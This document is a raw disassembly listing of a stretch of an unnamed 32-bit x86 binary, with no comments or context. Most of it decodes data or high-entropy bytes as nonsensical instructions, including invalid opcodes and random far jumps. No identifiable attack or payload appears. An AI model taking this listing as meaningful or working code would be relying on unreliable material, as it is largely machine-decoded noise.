  41d3e0:	cmp    cl,BYTE PTR [esi+0x30]
  41d3e3:	dec    esi
  41d3e4:	inc    esi
  41d3e5:	dec    esi
  41d3e6:	pop    esp
  41d3e7:	int    0x5f
  41d3e9:	ret    0xd26f
  41d3ec:	outs   dx,BYTE PTR ds:[esi]
  41d3ed:	sar    DWORD PTR [esi-0x1d],cl
  41d3f0:	jns    0x41d3d2
  41d3f2:	aas    
  41d3f3:	dec    esi
  41d3f4:	mov    cs,WORD PTR [edi+0x30]
  41d3f7:	dec    esi
  41d3f8:	lods   al,BYTE PTR ds:[esi]
  41d3f9:	dec    edi
  41d3fa:	cmp    eax,0x394f834e
  41d3ff:	dec    esi
  41d400:	mov    ds:0x304e3a4f,al
  41d405:	dec    esi
  41d406:	inc    esp
  41d407:	dec    esi
  41d408:	pop    esp
  41d409:	fstp   QWORD PTR [edi-0x2e]
  41d40c:	outs   dx,DWORD PTR ds:[esi]
  41d40d:	loop   0x41d47d
  41d40f:	jecxz  0x41d48f
  41d411:	repz jns 0x41d404
  41d414:	aas    
  41d415:	dec    esi
  41d416:	lea    ecx,[edi+0x30]
  41d419:	dec    esi
  41d41a:	lahf   
  41d41b:	dec    edi
  41d41c:	cmp    eax,0x3c4fa04e
  41d421:	dec    esi
  41d422:	xor    BYTE PTR [esi+0x3f],cl
  41d425:	dec    esi
  41d426:	pop    esp
  41d427:	in     eax,dx
  41d428:	pop    edi
  41d429:	loop   0x41d49a
  41d42b:	repnz outs dx,BYTE PTR ds:[esi]
  41d42d:	repz jle 0x41d433
  41d430:	jns    0x41d432
  41d432:	jle    0x41d447
  41d434:	jns    0x41d446
  41d436:	cmp    al,0x4e
  41d438:	jg     0x41d488
  41d43a:	xor    BYTE PTR [esi-0x65],cl
  41d43d:	dec    edi
  41d43e:	xor    cl,BYTE PTR [esi-0x80]
  41d441:	dec    edi
  41d442:	cmp    al,0x4e
  41d444:	lods   eax,DWORD PTR ds:[esi]
  41d445:	dec    edi
  41d446:	cmp    ecx,DWORD PTR [esi+0x30]
  41d449:	dec    esi
  41d44a:	inc    ebp
  41d44b:	dec    esi
  41d44c:	pop    esp
  41d44d:	or     eax,0x126f025f
  41d452:	outs   dx,BYTE PTR ds:[esi]
  41d453:	adc    edi,DWORD PTR [esi+0x23]
  41d456:	jns    0x41d478
  41d458:	aas    
  41d459:	dec    esi
  41d45a:	add    BYTE PTR [eax],al
  41d45c:	in     al,0xd2
  41d45e:	inc    ecx
  41d45f:	add    al,bl
  41d461:	aam    0x41
  41d463:	add    al,ah
  41d465:	aam    0x41
  41d467:	add    BYTE PTR [eax-0x2a],ch
  41d46a:	inc    ecx
  41d46b:	add    ah,dl
  41d46d:	aad    0x41
  41d46f:	add    BYTE PTR [eax-0x2a],bl
  41d472:	inc    ecx
  41d473:	add    al,al
  41d475:	aam    0x41
  41d477:	add    ah,al
  41d479:	aam    0x41
  41d47b:	add    BYTE PTR [esi+edx*8+0x41],dl
  41d47f:	add    BYTE PTR [eax],ch
  41d481:	aad    0x41
  41d483:	add    BYTE PTR ds:0x36f89ca9,cl
  41d489:	mov    edx,0xd4dcf89c
  41d48e:	inc    ecx
  41d48f:	add    BYTE PTR [ebp+edx*8-0x2a5fffbf],cl
  41d496:	inc    ecx
  41d497:	add    BYTE PTR [ebp+edx*8-0x2a43ffbf],ch
  41d49e:	inc    ecx
  41d49f:	add    BYTE PTR [edx*8-0x2d1fffbf],dl
  41d4a6:	inc    ecx
  41d4a7:	add    BYTE PTR [edx*8-0x2adbffbf],dh
  41d4ae:	inc    ecx
  41d4af:	add    BYTE PTR [esi+edx*8+0x41],ch
  41d4b3:	add    BYTE PTR [esi+0x19f89c85],dh
  41d4b9:	or     edx,DWORD PTR [edi]
  41d4bb:	sub    eax,0x140041d4
  41d4c1:	sbb    al,0x16
  41d4c3:	or     DWORD PTR [eax],0x7050d
  41d4c9:	add    BYTE PTR [eax+0x0],al
  41d4cc:	cmp    al,BYTE PTR [edx+0x3e]
  41d4cf:	ds retf 0x4247
  41d4d3:	add    BYTE PTR [ebp+0x55],ch
  41d4d6:	inc    esp
  41d4d7:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d4dd:	in     eax,dx
  41d4de:	inc    BYTE PTR [edi]
  41d4e0:	aas    
  41d4e1:	cli    
  41d4e2:	mov    ds:0x41d4d005,eax
  41d4e7:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d4ed:	xchg   esi,eax
  41d4ee:	pushf  
  41d4ef:	clc    
  41d4f0:	mov    ah,0x95
  41d4f2:	pushf  
  41d4f3:	clc    
  41d4f4:	mov    ebx,0xbaf89c95
  41d4f9:	xchg   ebp,eax
  41d4fa:	pushf  
  41d4fb:	clc    
  41d4fc:	mov    ecx,0xb8f89c95
  41d501:	xchg   ebp,eax
  41d502:	pushf  
  41d503:	clc    
  41d504:	mov    edi,0xbef89c95
  41d509:	xchg   ebp,eax
  41d50a:	pushf  
  41d50b:	clc    
  41d50c:	mov    ebp,0xa6f89c95
  41d511:	xchg   ebp,eax
  41d512:	pushf  
  41d513:	clc    
  41d514:	jmp    0x41d2:0xd86003f9
  41d51b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d522:	jbe    0x41d574
  41d524:	mov    dh,0x85
  41d526:	pushf  
  41d527:	clc    
  41d528:	sbb    ecx,ebp
  41d52a:	push   eax
  41d52b:	pop    es
  41d52c:	es pop es
  41d52e:	add    BYTE PTR [eax],al
  41d530:	aam    0xd2
  41d532:	inc    ecx
  41d533:	add    BYTE PTR [ebx],bl
  41d535:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41d568:	mov    WORD PTR [eax],ss
  41d56a:	inc    edx
  41d56b:	add    BYTE PTR [esi+0x67f89c85],dh
  41d571:	pushw  0x68
  41d574:	addr16 push 0x67
  41d577:	pushw  0x6b6a
  41d57b:	push   0x676b67
	...
  41d588:	es aas 
  41d58a:	inc    eax
  41d58b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d591:	dec    edi
  41d592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d593:	dec    edi
  41d594:	lahf   
  41d595:	dec    edi
  41d596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d597:	dec    edi
  41d598:	ins    DWORD PTR es:[edi],dx
  41d599:	dec    esi
  41d59a:	bound  ecx,QWORD PTR [esi+0x30]
  41d59d:	dec    esi
  41d59e:	add    BYTE PTR [eax],al
  41d5a0:	cdq    
  41d5a1:	dec    edi
  41d5a2:	pushf  
  41d5a3:	dec    edi
  41d5a4:	fwait
  41d5a5:	dec    edi
  41d5a6:	ins    DWORD PTR es:[edi],dx
  41d5a7:	dec    esi
  41d5a8:	bound  ecx,QWORD PTR [esi+0x30]
  41d5ab:	dec    esi
  41d5ac:	scas   eax,DWORD PTR es:[edi]
  41d5ad:	dec    edi
  41d5ae:	lods   eax,DWORD PTR ds:[esi]
  41d5af:	dec    edi
  41d5b0:	lahf   
  41d5b1:	dec    edi
  41d5b2:	mov    ds:0x624e6d4f,al
  41d5b7:	dec    esi
  41d5b8:	xor    BYTE PTR [esi+0x0],cl
  41d5bb:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d5c1:	dec    edi
  41d5c2:	test   eax,0xa04f934f
  41d5c7:	dec    edi
  41d5c8:	fwait
  41d5c9:	dec    edi
  41d5ca:	xor    BYTE PTR [esi+0x0],cl
  41d5cd:	add    BYTE PTR [eax],al
  41d5cf:	add    BYTE PTR [eax],al
  41d5d1:	add    BYTE PTR [eax],al
  41d5d3:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d5da:	mov    WORD PTR [ebp-0x32734274],gs
  41d5e0:	mov    ebp,ds
  41d5e2:	mov    ebp,gs
  41d5e4:	mov    ebp,?
  41d5e6:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d5ec:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d5f2:	mov    WORD PTR [edx-0x74],?
  41d5f5:	jae    0x41d583
  41d5f7:	jo     0x41d585
  41d5f9:	jno    0x41d587
  41d5fb:	jbe    0x41d589
  41d5fd:	ja     0x41d58b
  41d5ff:	je     0x41d58d
  41d601:	jne    0x41d58f
  41d603:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d60a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d610:	lods   al,BYTE PTR ds:[esi]
  41d611:	jge    0x41d5cf
  41d613:	jge    0x41d5b3
  41d615:	(bad)  
  41d616:	jns    0x41d68b
  41d618:	mov    ecx,0x7d738cb1
  41d61d:	ins    DWORD PTR es:[edi],dx
  41d61e:	enter  0x9fc6,0x26
  41d622:	jb     0x41d627
  41d624:	test   eax,0xb956bb17
  41d629:	hlt    
  41d62a:	test   al,0x37
  41d62c:	test   al,0x7e
  41d62e:	fnstenv [ecx-0x6a]
  41d631:	mov    cl,0x6a
  41d633:	push   0xffffffce
  41d635:	or     BYTE PTR [edx],bl
  41d637:	xlat   BYTE PTR ds:[ebx]
  41d638:	out    dx,eax
  41d639:	add    eax,0x9321d7aa
  41d63e:	scas   al,BYTE PTR es:[edi]
  41d63f:	adc    DWORD PTR [esi],esp
  41d641:	jge    0x41d666
  41d643:	fidiv  WORD PTR [edi]
  41d645:	leave  
  41d646:	hlt    
  41d647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d648:	cmp    ax,0x1fc8
  41d64c:	mov    dh,cl
  41d64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d64f:	(bad)  
  41d650:	and    DWORD PTR [eax],ebx
  41d652:	and    DWORD PTR [ecx-0x18],esi
  41d655:	(bad)  [ebx+0x7]
  41d658:	cmc    
  41d659:	enter  0x301a,0x40
  41d65d:	adc    BYTE PTR [edx+0x0],al
  41d660:	jno    0x41d6c8
  41d662:	jp     0x41d6d2
  41d664:	enter  0x41d4,0x0
  41d668:	sub    al,0xd5
  41d66a:	inc    ecx
  41d66b:	add    BYTE PTR [eax],cl
  41d66d:	in     eax,dx
  41d66e:	adc    al,BYTE PTR [edi]
  41d670:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d677:	ins    BYTE PTR es:[edi],dx
  41d678:	push   0x49657557
  41d67d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d683:	push   edi
  41d684:	ins    BYTE PTR es:[edi],dx
  41d685:	inc    edx
  41d686:	push   0x76666a73
  41d68b:	inc    edx
  41d68c:	jo     0x41d6d7
  41d68e:	dec    ebp
  41d68f:	dec    ebp
  41d690:	pop    edx
  41d691:	jp     0x41d6ed
  41d693:	jbe    0x41d6db
  41d695:	pop    ecx
  41d696:	jo     0x41d710
	...
  41d6ac:	inc    ebp
  41d6ad:	push   edx
  41d6ae:	jb     0x41d724
  41d6b0:	inc    esi
  41d6b1:	je     0x41d6f4
  41d6b3:	inc    esi
  41d6b4:	jae    0x41d72c
  41d6b6:	dec    ebx
  41d6b7:	gs inc edx
  41d6b9:	inc    bx
  41d6bb:	push   ebp
  41d6bc:	jno    0x41d734
  41d6be:	ja     0x41d727
  41d6c0:	dec    edi
  41d6c1:	dec    esp
  41d6c2:	dec    ebp
  41d6c3:	inc    edx
  41d6c4:	jno    0x41d737
  41d6c6:	jae    0x41d71b
  41d6c8:	dec    eax
  41d6c9:	inc    ebp
  41d6ca:	inc    esp
  41d6cb:	inc    esp
  41d6cc:	push   ecx
  41d6cd:	dec    edx
  41d6ce:	ins    BYTE PTR es:[edi],dx
  41d6cf:	dec    ebx
  41d6d0:	jbe    0x41d740
  41d6d2:	pop    eax
  41d6d3:	jbe    0x41d720
  41d6d5:	inc    ecx
  41d6d6:	fs gs jno 0x41d747
  41d6da:	push   ebx
  41d6db:	inc    ecx
  41d6dc:	add    BYTE PTR [eax],al
  41d6de:	inc    ebx
  41d6df:	outs   dx,BYTE PTR ds:[esi]
  41d6e0:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d6e4:	push   edx
  41d6e5:	push   ecx
  41d6e6:	push   0x74000064
  41d6eb:	jne    0x41d762
  41d6ed:	ins    DWORD PTR es:[edi],dx
  41d6ee:	push   ecx
  41d6ef:	push   eax
  41d6f0:	jo     0x41d76c
  41d6f2:	addr16 jo 0x41d74b
  41d6f5:	pop    eax
  41d6f6:	add    BYTE PTR [eax],al
  41d6f8:	push   ecx
  41d6f9:	pop    ecx
  41d6fa:	inc    ebx
  41d6fb:	inc    edx
  41d6fc:	outs   dx,BYTE PTR ds:[esi]
  41d6fd:	popa   
  41d6fe:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d702:	jne    0x41d772
  41d704:	dec    ebx
  41d705:	add    BYTE PTR [ecx+0x45],bh
  41d708:	bound  ebp,QWORD PTR [ecx+0x46]
  41d70b:	dec    ecx
  41d70c:	ja     0x41d753
  41d70e:	dec    eax
  41d70f:	inc    ebp
  41d710:	inc    edx
  41d711:	push   ebx
  41d712:	add    BYTE PTR [eax],al
  41d714:	je     0x41d779
  41d716:	bound  esp,QWORD PTR [edi+0x78]
  41d719:	dec    eax
  41d71a:	bound  edx,QWORD PTR [ebx+0x43]
  41d71d:	pop    eax
  41d71e:	outs   dx,DWORD PTR ds:[esi]
  41d71f:	push   0x4355
  41d724:	inc    edi
  41d725:	gs ins BYTE PTR es:[edi],dx
  41d727:	dec    esp
  41d728:	js     0x41d792
  41d72a:	inc    edx
  41d72b:	js     0x41d773
  41d72d:	arpl   WORD PTR [eax],ax
  41d72f:	add    BYTE PTR [eax],al
  41d731:	add    BYTE PTR [eax],al
  41d733:	add    BYTE PTR [edx+0x70],cl
  41d736:	jb     0x41d7b0
  41d738:	outs   dx,DWORD PTR ds:[esi]
  41d739:	pop    eax
  41d73a:	dec    ebx
  41d73b:	push   esp
  41d73c:	dec    esp
  41d73d:	jns    0x41d78a
  41d73f:	js     0x41d7b9
  41d741:	outs   dx,BYTE PTR ds:[esi]
  41d742:	pop    ecx
  41d743:	jae    0x41d7b3
  41d745:	push   0x43644448
  41d74a:	arpl   WORD PTR [edx+0x55],sp
  41d74d:	push   0x42504e67
  41d752:	push   ebp
  41d753:	je     0x41d7ca
  41d755:	addr16 dec edi
  41d757:	dec    esp
  41d758:	inc    edx
  41d759:	ins    DWORD PTR es:[edi],dx
  41d75a:	inc    esi
  41d75b:	inc    esi
  41d75c:	inc    esi
  41d75d:	arpl   WORD PTR [edx+0x47],bx
  41d760:	push   ebp
  41d761:	inc    ebx
  41d762:	popa   
  41d763:	push   edx
  41d764:	dec    esp
  41d765:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d76c:	push   ecx
  41d76d:	push   ebx
  41d76e:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d775:	dec    edx
  41d776:	jns    0x41d7e1
  41d778:	push   edx
  41d779:	inc    ebx
  41d77a:	jo     0x41d7f1
  41d77c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d780:	fs push ebx
  41d782:	inc    ebx
  41d783:	push   ebp
  41d784:	push   eax
  41d785:	ja     0x41d801
  41d787:	jp     0x41d7d6
  41d789:	push   esi
  41d78a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d78e:	dec    edx
  41d78f:	dec    esi
  41d790:	data16 ja 0x41d7e1
  41d793:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d79a:	dec    esp
  41d79b:	cmp    ebx,ebp
  41d79d:	dec    esp
  41d79e:	lods   eax,DWORD PTR ds:[esi]
  41d79f:	out    dx,al
  41d7a0:	mov    ebp,0xa53ddffb
  41d7a5:	js     0x41d760
  41d7a7:	fiadd  DWORD PTR [edx-0x7d]
  41d7aa:	imul   BYTE PTR [ebp-0x51fffe6a]
  41d7b0:	add    BYTE PTR [eax],al
  41d7b2:	add    BYTE PTR [ecx],bh
  41d7b4:	push   0xc7304013
  41d7b9:	pop    ss
  41d7ba:	mov    ch,0xc4
  41d7bc:	jg     0x41d810
  41d7be:	sub    bh,BYTE PTR [ebx]
  41d7c0:	sub    al,0xd8
  41d7c2:	inc    esi
  41d7c3:	iret   
  41d7c4:	adc    al,0x1d
  41d7c6:	mov    al,ds:0xae883d16
  41d7cb:	jo     0x41d7b3
  41d7cd:	mov    edx,0x945636ca
  41d7d2:	push   0x5d
  41d7d4:	int    0x78
  41d7d6:	mov    dh,ah
  41d7d8:	sub    eax,0xcac339ee
  41d7dd:	pop    esi
  41d7de:	repnz adc ch,ah
  41d7e1:	xor    bl,BYTE PTR [ebx-0x4ec9c267]
  41d7e7:	mov    ah,0xbe
  41d7e9:	js     0x41d7ea
  41d7eb:	jge    0x41d7e8
  41d7ed:	xchg   edi,eax
  41d7ee:	inc    edi
  41d7ef:	pushf  
  41d7f0:	pusha  
  41d7f1:	push   0xfffffff8
  41d7f3:	aas    
  41d7f4:	fcom   st(7)
  41d7f6:	jbe    0x41d830
  41d7f8:	clc    
  41d7f9:	je     0x41d7be
  41d7fb:	loope  0x41d87c
  41d7fd:	cmp    eax,0xbc742008
  41d802:	repnz (bad) 
  41d804:	jle    0x41d7db
  41d806:	mov    ecx,0x2922dac
  41d80b:	ret    0x4ee2
  41d80e:	je     0x41d861
  41d810:	fild   WORD PTR [ecx]
  41d812:	or     ebx,ecx
  41d814:	dec    ebp
  41d815:	mov    bh,0x34
  41d817:	pop    ds
  41d818:	fs imul edx,ebp,0x5c745e1a
  41d81f:	push   ebp
  41d820:	shl    al,cl
  41d822:	mov    edi,0xde2c7717
  41d827:	xor    DWORD PTR [esp+ecx*8],edx
  41d82a:	jmp    0xe7ad:0xde7b2dd7
  41d831:	jp     0x41d7e5
  41d833:	mov    esp,eax
  41d835:	cli    
  41d836:	sub    al,0x2a
  41d838:	retf   0x9d51
  41d83b:	cmp    ecx,ecx
  41d83d:	ret    
  41d83e:	cwde   
  41d83f:	into   
  41d840:	out    0xbc,eax
  41d842:	mov    al,ds:0x86b048c0
  41d847:	adc    DWORD PTR [eax],ebx
  41d849:	jbe    0x41d817
  41d84b:	inc    ecx
  41d84c:	pop    ds
  41d84d:	rcl    BYTE PTR [ebx+0x48],cl
  41d850:	mov    edx,0x7ec554a4
  41d855:	and    DWORD PTR [ebp-0x7c0e67ab],ebx
  41d85b:	in     al,dx
  41d85c:	out    dx,al
  41d85d:	mov    ch,0xc7
  41d85f:	jge    0x41d872
	...
  41d869:	add    BYTE PTR [eax],al
  41d86b:	sub    BYTE PTR [edx+0x57bf52a5],dh
  41d871:	(bad)  
  41d872:	cli    
  41d873:	jl     0x41d8d9
  41d875:	xlat   BYTE PTR ds:[ebx]
  41d876:	push   esi
  41d877:	in     al,0xc
  41d879:	push   ss
  41d87a:	pop    ds
  41d87b:	pop    ebx
  41d87c:	xchg   edi,eax
  41d87d:	add    DWORD PTR [eax],eax
  41d87f:	scas   al,BYTE PTR es:[edi]
  41d880:	add    BYTE PTR [eax],al
  41d882:	add    BYTE PTR [eax+edi*8-0x960e357],ah
  41d889:	mov    edi,0xc322c9e2
  41d88e:	test   eax,0x4c0f7c94
  41d893:	je     0x41d875
  41d895:	jp     0x41d900
  41d897:	retf   0xcdbc
  41d89a:	cmp    BYTE PTR [esi],ah
  41d89c:	adc    BYTE PTR [edx+0x15244955],bh
  41d8a2:	dec    ax
  41d8a4:	lock imul edi,DWORD PTR [edi],0x71af644
  41d8ab:	in     al,0x37
  41d8ad:	lahf   
  41d8ae:	ins    BYTE PTR es:[edi],dx
  41d8af:	loop   0x41d8f5
  41d8b1:	mov    esp,0x5c462a8f
  41d8b6:	mov    edi,DWORD PTR [ebp-0x55f55b26]
  41d8bc:	mov    es,WORD PTR [edx-0x58]
  41d8bf:	arpl   WORD PTR [esi+0x44a47885],bp
  41d8c5:	repz mov dh,0x86
  41d8c8:	bound  esi,QWORD PTR [ebp+0x4f13972d]
  41d8ce:	pop    eax
  41d8cf:	adc    eax,0xedf5d448
  41d8d4:	(bad)  
  41d8d5:	and    al,0xa7
  41d8d7:	xor    DWORD PTR [edx+0x140805ba],esp
  41d8dd:	mov    DWORD PTR [edx+0x7a930df0],esp
  41d8e3:	jmp    0x3904:0xed93dd68
  41d8ea:	add    ch,BYTE PTR [eax+ecx*4-0x6d0e774e]
  41d8f1:	hlt    
  41d8f2:	pop    ebx
  41d8f3:	js     0x41d8b8
  41d8f5:	cmc    
  41d8f6:	and    DWORD PTR [esi-0x1a],0xcd475209
  41d8fd:	arpl   WORD PTR [ebp-0x4d2ce225],bx
  41d903:	ins    BYTE PTR es:[edi],dx
  41d904:	jp     0x6d6b2500
  41d90a:	pop    ecx
  41d90b:	pop    ebx
  41d90c:	add    BYTE PTR [ebp+0x5b],ch
  41d90f:	sbb    BYTE PTR [ebp-0x6772b8b4],bl
  41d915:	xchg   ecx,eax
  41d916:	adc    al,0xcb
  41d918:	out    0x98,al
  41d91a:	fld    TBYTE PTR [esi]
  41d91c:	(bad)  
  41d91d:	sub    al,0xaa
  41d91f:	and    al,0xbb
  41d921:	dec    esi
  41d922:	(bad)  
  41d923:	enter  0x8a1,0x64
  41d927:	push   ebx
  41d928:	pop    ds
  41d929:	dec    edx
  41d92a:	jb     0x41d8ca
  41d92c:	inc    ecx
  41d92d:	push   ss
  41d92e:	jle    0x41d94e
  41d930:	imul   eax,DWORD PTR [eax],0x0
  41d936:	add    BYTE PTR [eax],al
  41d938:	add    BYTE PTR [eax],al
  41d93a:	add    BYTE PTR [ebx-0x7e80ab],dh
  41d940:	stos   DWORD PTR es:[edi],eax
  41d941:	push   DWORD PTR [edi-0x42]
  41d944:	xchg   esi,eax
  41d945:	push   0x3de45257
  41d94a:	jmp    0xae:0x19809
  41d951:	add    BYTE PTR [eax],al
  41d953:	dec    esi
  41d954:	bound  ecx,QWORD PTR [ecx+0x7a]
  41d957:	or     ebx,DWORD PTR [ebp+0x10]
  41d95a:	xchg   edx,eax
  41d95b:	pop    ebp
  41d95c:	mov    ebp,0xcf38f647
  41d961:	fcom   QWORD PTR [ebx]
  41d963:	cmc    
  41d964:	je     0x41d964
  41d966:	pop    esp
  41d967:	adc    DWORD PTR [eax],ebx
  41d969:	pop    ss
  41d96a:	fdivr  QWORD PTR [esi+eiz*1]
  41d96d:	cmp    ecx,esi
  41d96f:	es scas al,BYTE PTR es:[edi]
  41d971:	mov    dh,0x8d
  41d973:	in     al,0xc2
  41d975:	nop
  41d976:	mov    esi,0xf084226
  41d97b:	mov    al,ds:0x7b93f793
  41d980:	inc    edx
  41d981:	fcomi  st,st(4)
  41d983:	dec    edx
  41d984:	mov    al,ds:0xdba77a6d
  41d989:	adc    BYTE PTR ds:0x6ae16bf6,bh
  41d98f:	ret    
  41d990:	dec    esi
  41d991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d992:	aam    0x4f
  41d994:	repz jg 0x41d9d9
  41d997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d998:	cmp    BYTE PTR [esi-0x88c1a79],dh
  41d99e:	leave  
  41d99f:	mov    dl,0x8e
  41d9a1:	push   cs
  41d9a2:	cmp    dh,BYTE PTR [edi+0x7d]
  41d9a5:	dec    esp
  41d9a6:	push   edx
  41d9a7:	loopne 0x41d935
  41d9a9:	mov    edi,0x88a83847
  41d9ae:	and    ebx,DWORD PTR [edi+0x21]
  41d9b1:	out    dx,al
  41d9b2:	je     0x41d959
  41d9b4:	outs   dx,DWORD PTR ds:[esi]
  41d9b5:	sub    bh,0x75
  41d9b8:	or     DWORD PTR [ecx+0x46de1816],0x2035321c
  41d9c2:	xchg   esi,eax
  41d9c3:	test   eax,0x199d0307
  41d9c8:	rcr    DWORD PTR [ebp+0x33],1
  41d9cb:	push   0x3bc98aa2
  41d9d0:	pop    esp
  41d9d1:	jae    0x41da42
  41d9d3:	retf   0x24c2
  41d9d6:	aad    0xc7
  41d9d8:	imul   esp,DWORD PTR [edx+0x3502be8],0x42
  41d9df:	(bad)  
  41d9e1:	sub    DWORD PTR [ebx-0x56],edi
  41d9e4:	cwde   
  41d9e5:	shl    DWORD PTR [eax-0xc],1
  41d9e8:	pop    edx
  41d9e9:	fisub  DWORD PTR ds:0xc78b1c5a
  41d9ef:	sbb    BYTE PTR [edx+0x3400b2bc],al
  41d9f5:	cmp    DWORD PTR [eax-0x56],edx
  41d9f8:	adc    BYTE PTR [ebx],dh
  41d9fa:	or     bh,0x7
  41d9fd:	mov    bh,0x41
  41d9ff:	mov    ecx,0x90
  41da04:	add    BYTE PTR [eax],al
  41da06:	add    BYTE PTR [eax],al
  41da08:	add    BYTE PTR [eax],al
  41da0a:	add    BYTE PTR [eax],bh
  41da0c:	(bad)  
  41da0d:	cmp    ah,BYTE PTR [esi+edi*8]
  41da10:	in     al,dx
  41da11:	fimul  WORD PTR ds:[edi+0x37ac6bd5]
  41da18:	pop    es
  41da19:	push   0x198b779
  41da1e:	add    BYTE PTR [esi-0x54000000],ch
  41da24:	mov    DWORD PTR [edx+eax*4],edi
  41da27:	jbe    0x41d9ac
  41da29:	sub    eax,0x5e2f2187
  41da2e:	test   eax,0x18467ee1
  41da33:	cwde   
  41da34:	mov    ch,0xfb
  41da36:	or     al,0xd0
  41da38:	rcl    ebp,1
  41da3a:	int3   
  41da3b:	dec    ebx
  41da3c:	jecxz  0x41da3d
  41da3e:	adc    al,0x5c
  41da40:	je     0x41da0d
  41da42:	out    dx,al
  41da43:	pop    ebx
  41da44:	push   es
  41da45:	dec    ebx
  41da46:	pop    es
  41da47:	xchg   esi,eax
  41da48:	jne    0x41da1e
  41da4a:	push   esi
  41da4b:	add    edi,edx
  41da4d:	mov    cl,0x77
  41da4f:	in     eax,0x9b
  41da51:	mov    bl,0x71
  41da53:	lock aas 
  41da55:	les    bx,DWORD PTR [esi]
  41da58:	test   al,0xc2
  41da5a:	jns    0x41da1b
  41da5c:	shl    BYTE PTR fs:[edi],cl
  41da5f:	int3   
  41da60:	cwde   
  41da61:	lahf   
  41da62:	leave  
  41da63:	add    DWORD PTR [ebp-0x63d0159f],0x4c
  41da6a:	and    DWORD PTR [ebx+0x1f59767c],0x46
  41da71:	jbe    0x41da2f
  41da73:	adc    eax,0x4d375636
  41da78:	dec    edx
  41da79:	ret    
  41da7a:	arpl   WORD PTR [ebp+0x38fc5e47],sp
  41da80:	(bad)  
  41da81:	leave  
  41da82:	test   al,0x38
  41da84:	imul   esi,DWORD PTR [ebx+0x1e6304fd],0xffffffa2
  41da8b:	xor    ebx,DWORD PTR [esp+edx*4-0x70]
  41da8f:	pop    edx
  41da90:	leave  
  41da91:	outs   dx,DWORD PTR ds:[esi]
  41da92:	(bad)  
  41da93:	jge    0x41da26
  41da95:	and    eax,0x2da31cc5
  41da9a:	pop    esi
  41da9b:	pop    eax
  41da9c:	dec    edi
  41da9d:	std    
  41da9e:	ins    BYTE PTR es:[edi],dx
  41da9f:	popa   
  41daa0:	test   BYTE PTR [ecx+0x55f5c5b9],al
  41daa6:	pop    es
  41daa7:	add    ebx,edx
  41daa9:	add    ebx,ecx
  41daab:	aas    
  41daac:	mov    eax,0x46e32800
  41dab1:	xchg   ah,al
  41dab3:	fisub  WORD PTR ds:[eax+0x549bbf43]
  41daba:	hlt    
  41dabb:	es mov al,0x70
  41dabe:	into   
  41dabf:	pop    ss
  41dac0:	cmc    
  41dac1:	out    dx,eax
  41dac2:	cmp    bl,BYTE PTR [eax+0x1]
  41dac5:	add    al,0xa3
  41dac7:	popa   
  41dac8:	out    0x3d,eax
  41daca:	icebp  
  41dacb:	push   es
  41dacc:	dec    eax
  41dacd:	dec    edi
  41dace:	push   ds
  41dacf:	jecxz  0x41da7e
	...
  41dad9:	add    BYTE PTR [eax],al
  41dadb:	fnstenv [esi-0x2490e49a]
  41dae1:	std    
  41dae2:	neg    BYTE PTR [esi]
  41dae4:	sub    esp,DWORD PTR [ebx-0x23]
  41dae7:	sahf   
  41dae8:	push   es
  41dae9:	jno    0x41dacf
  41daeb:	gs cdq 
  41daed:	add    DWORD PTR [eax],eax
  41daef:	scas   al,BYTE PTR es:[edi]
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	add    dl,dh
  41daf4:	inc    esp
  41daf5:	div    BYTE PTR [ebx-0x65]
  41daf8:	push   0xe0a359e3
  41dafd:	es jae 0x41daf3
  41db00:	jmp    0x8a4c1024
  41db05:	mov    DWORD PTR [ecx-0x4610942c],esi
  41db0b:	gs and al,0x23
  41db0e:	jmp    0x9fc0:0xb9988a09
  41db15:	adc    bh,BYTE PTR [edi+edi*2+0x5b]
  41db19:	ins    DWORD PTR es:[edi],dx
  41db1a:	cli    
  41db1b:	into   
  41db1c:	lock push ss
  41db1e:	cmp    al,0x11
  41db20:	and    DWORD PTR [edx],edi
  41db22:	loope  0x41db63
  41db24:	sub    ebp,DWORD PTR [edx]
  41db26:	test   DWORD PTR [ebx],0x23806cbd
  41db2c:	xchg   bh,dl
  41db2e:	dec    ebp
  41db2f:	es fs jg 0x41db1f
  41db33:	push   eax
  41db34:	add    bl,BYTE PTR [eax+0x71]
  41db37:	retf   
  41db38:	jmp    0xc08c:0x22a4ee79
  41db3f:	(bad)
  41db43:	xor    ebp,DWORD PTR [ecx]
  41db45:	pop    ds
  41db46:	out    dx,eax
  41db47:	int3   
  41db48:	mov    al,0x21
  41db4a:	sbb    BYTE PTR [ebx+esi*8],0xe3
  41db4e:	xchg   DWORD PTR [edi+0x7e],edx
  41db51:	xor    ebp,DWORD PTR [edi+esi*4-0x6]
  41db55:	cmp    eax,0x52e73083
  41db5a:	iret   
  41db5b:	mov    esp,DWORD PTR [ebx+0x4b04f5ad]
  41db61:	or     eax,0x50dda1e0
  41db66:	shr    DWORD PTR [eax+eax*1],1
  41db69:	mov    ch,0x9c
  41db6b:	ja     0x41db86
  41db6d:	pop    ecx
